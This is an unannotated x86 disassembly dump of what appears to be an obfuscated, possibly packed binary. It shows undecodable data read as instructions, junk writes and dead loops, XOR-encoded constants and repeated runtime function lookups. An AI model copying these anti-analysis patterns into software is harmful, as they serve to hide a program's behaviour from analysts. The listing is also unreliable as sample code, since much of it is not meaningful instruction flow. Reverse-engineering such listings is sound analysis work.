  4204f3:	xor    DWORD PTR [ebx],0xa81971b0
  4204f9:	mov    edi,DWORD PTR [ebx+0x60854a1d]
  4204ff:	in     eax,0x2a
  420501:	xor    DWORD PTR [ecx],ebx
  420503:	and    ah,BYTE PTR [ebx]
  420505:	loope  0x420490
  420507:	mov    WORD PTR [edx],es
  420509:	sbb    BYTE PTR [esi-0xbb0b306],dh
  42050f:	xor    BYTE PTR [ebp+0x4d],dh
  420512:	dec    edx
  420513:	repz inc ecx
  420515:	sub    edx,eax
  420517:	dec    ebp
  420518:	jo     0x4204e9
  42051a:	push   cs
  42051b:	rol    BYTE PTR es:[edi-0x6634c66c],cl
  420522:	mov    eax,ds:0xc5adb5b6
  420527:	fisub  DWORD PTR [ecx-0x71]
  42052a:	pop    ebp
  42052b:	mov    eax,0x76b28676
  420530:	add    esp,eax
  420532:	sbb    eax,0x1d03a2ab
  420537:	sbb    bl,al
  420539:	xor    al,BYTE PTR [eax-0x34f516b]
  42053f:	loop   0x420565
  420541:	or     BYTE PTR [ebp+eiz*2-0x6c],al
  420545:	sub    edi,DWORD PTR [eax+ebx*2+0xa7b251c]
  42054c:	(bad)  
  42054d:	xlat   BYTE PTR ds:[ebx]
  42054e:	lods   al,BYTE PTR ds:[esi]
  42054f:	inc    edx
  420550:	sub    BYTE PTR [edx],0x38
  420553:	arpl   WORD PTR [ecx+0x14b8eb09],sp
  420559:	sbb    al,0xbc
  42055b:	inc    esi
  42055c:	adc    edx,DWORD PTR [edi+eax*8-0x158c0d14]
  420563:	retf   
  420564:	push   0xf62ff94b
  420569:	sub    al,0xca
  42056b:	dec    ebp
  42056c:	lds    ecx,FWORD PTR [esi+0x23]
  42056f:	nop
  420570:	adc    eax,0x620c270d
  420575:	sub    BYTE PTR [ecx-0x60],ch
  420578:	(bad)  
  420579:	cmp    dl,BYTE PTR [ebx]
  42057b:	inc    ebx
  42057c:	cmp    DWORD PTR [esi+0x58],eax
  42057f:	mov    al,ds:0x1d89a345
  420584:	add    al,0xa2
  420586:	push   edi
  420587:	push   ss
  420588:	xor    DWORD PTR [edi+0xd585769],0xffffffc1
  42058f:	out    dx,eax
  420590:	cwde   
  420591:	cli    
  420592:	enter  0xb694,0x42
  420596:	mov    ds:0x9d54f253,al
  42059b:	jno    0x42060a
  42059d:	lahf   
  42059e:	loope  0x4205c5
  4205a0:	sub    eax,DWORD PTR [ecx+0x41]
  4205a3:	jle    0x420599
  4205a5:	iret   
  4205a6:	xor    al,0xc8
  4205a8:	mov    edx,0x159a8f70
  4205ad:	mov    ds:0xb61b11b4,al
  4205b2:	sbb    DWORD PTR [esi+0x48],esp
  4205b5:	fld    DWORD PTR [ebp-0x2b]
  4205b8:	pop    ecx
  4205b9:	pop    esp
  4205ba:	jmp    0x7662:0x95565553
  4205c1:	daa    
  4205c2:	push   ss
  4205c3:	retf   
  4205c4:	adc    BYTE PTR [edx+0x1e829d9f],bh
  4205ca:	and    BYTE PTR [ebp-0x18ceae56],0xe7
  4205d1:	jo     0x420649
  4205d3:	pop    eax
  4205d4:	jo     0x420572
  4205d6:	fldcw  WORD PTR [edi-0x1a96e0dc]
  4205dc:	push   esp
  4205dd:	cmc    
  4205de:	frstor [ebp+0x17a24c98]
  4205e4:	mov    ds:0x16b85241,al
  4205e9:	push   edx
  4205ea:	pop    edi
  4205eb:	cmp    edx,DWORD PTR [eax-0x6]
  4205ee:	jae    0x4205b1
  4205f0:	inc    ecx
  4205f1:	sub    eax,0x2b13e9b2
  4205f6:	sub    al,0x5e
  4205f8:	lock sub eax,DWORD PTR es:[bx+di+0x6]
  4205fe:	addr16 xstore-rng 
  420602:	je     0x42063f
  420604:	shr    DWORD PTR [edx],1
  420606:	add    eax,0x3fcf6c13
  42060b:	jg     0x4205b1
  42060d:	repz sbb eax,0x649e87e8
  420613:	adc    eax,0x409dd34
  420618:	ret    0x1b3c
  42061b:	dec    esi
  42061c:	or     DWORD PTR [eax],edi
  42061e:	pop    esp
  42061f:	adc    DWORD PTR [esi+0x654e2f5f],edx
  420625:	inc    ecx
  420626:	push   0x8defa57e
  42062b:	push   ebx
  42062c:	popa   
  42062d:	and    BYTE PTR cs:[eax+0x26],0x1b
  420632:	mov    ebp,DWORD PTR [edi]
  420634:	cmp    BYTE PTR [esi],dh
  420636:	push   edx
  420637:	and    DWORD PTR [eax],esi
  420639:	cld    
  42063a:	imul   edx,ebp,0x40ec50a1
  420640:	lods   al,BYTE PTR ds:[esi]
  420641:	imul   ebp,DWORD PTR [eax-0x69],0xffffffac
  420645:	jb     0x42060f
  420647:	push   edx
  420648:	pop    ss
  420649:	das    
  42064a:	in     eax,0xcd
  42064c:	push   ss
  42064d:	jmp    0xb9e484b2
  420652:	push   ebx
  420653:	into   
  420654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420655:	leave  
  420656:	sub    bl,BYTE PTR [edx+esi*2-0x7899059e]
  42065d:	or     bl,BYTE PTR [ebp+eax*2-0x6e50f9bf]
  420664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420665:	stos   DWORD PTR es:[edi],eax
  420666:	fidivr WORD PTR [ecx]
  420668:	mov    ecx,0x49cb9b82
  42066d:	push   edi
  42066e:	out    dx,al
  42066f:	or     edx,esp
  420671:	out    0xba,al
  420673:	cwde   
  420674:	mov    ch,0x72
  420676:	fistp  DWORD PTR [edx-0x66ca9494]
  42067c:	lods   al,BYTE PTR ds:[esi]
  42067d:	and    BYTE PTR [edi],dl
  42067f:	sub    al,0x8c
  420681:	bound  eax,QWORD PTR [eax]
  420683:	and    al,0xd0
  420685:	jg     0x4206e4
  420687:	xchg   esi,eax
  420688:	sti    
  420689:	popa   
  42068a:	lahf   
  42068b:	pop    esp
  42068c:	dec    edi
  42068d:	or     eax,0xde58a96d
  420692:	(bad)  
  420693:	nop
  420694:	test   al,0xac
  420696:	mov    ecx,0xd8eda11c
  42069b:	xor    ecx,0x66ec4911
  4206a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206a2:	mov    ebp,0xf7133196
  4206a7:	or     DWORD PTR [ecx],esi
  4206a9:	das    
  4206aa:	xor    DWORD PTR [ebx+edx*8-0x6],ebx
  4206ae:	sbb    ch,BYTE PTR [edi]
  4206b0:	jbe    0x4206e6
  4206b2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4206b4:	xor    ebp,edi
  4206b6:	popa   
  4206b7:	mov    ebx,edx
  4206b9:	xchg   BYTE PTR [ebx+esi*1-0x64],cl
  4206bd:	and    bl,0xf1
  4206c0:	out    0x93,eax
  4206c2:	mov    al,0x29
  4206c4:	out    0x63,eax
  4206c6:	popa   
  4206c7:	push   0xffffff80
  4206c9:	(bad)  
  4206ca:	push   esp
  4206cb:	int3   
  4206cc:	sbb    ch,ch
  4206ce:	test   al,0x53
  4206d0:	sbb    eax,0xf8b9a77e
  4206d5:	and    DWORD PTR [eax-0x576b95c2],ebx
  4206db:	shl    DWORD PTR [edi+0x11d81991],cl
  4206e1:	mov    dh,0x60
  4206e3:	jns    0x4206ca
  4206e5:	mov    bh,BYTE PTR [ebx]
  4206e7:	or     al,0xcb
  4206e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ea:	pop    eax
  4206eb:	mov    DWORD PTR [ebp-0x1c],edi
  4206ee:	mov    edi,DWORD PTR [ebp+0x8]
  4206f1:	xor    edi,ecx
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42aa27
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42a9e3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42a9f7
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a0ab
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42a9fb
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42a9ff
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42aa03
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42aa07
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42aa0b
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42aa0f
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42aa13
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
